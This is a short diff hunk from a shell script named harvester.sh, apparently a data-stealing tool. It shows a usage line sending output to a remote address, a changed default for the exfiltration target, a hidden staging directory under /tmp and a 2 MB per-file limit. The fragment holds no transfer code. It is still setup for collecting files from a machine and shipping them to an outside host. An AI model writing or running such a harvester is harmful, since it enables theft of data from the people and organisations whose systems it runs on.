@@ -14,7 +14,7 @@
 #    EXFIL=1.2.3.4:8080 sh harvester.sh
 # ==============================================================================
 
-EXFIL="${EXFIL:-HOST:PORT}"
+EXFIL="${EXFIL:-__EXFIL__}"
 TAG="${TAG:-$(hostname 2>/dev/null | tr -cd 'A-Za-z0-9._-')}"
 STAGE="/tmp/.$TAG.$$"
 MAX_ITEM=2097152          # 单文件 2 MB
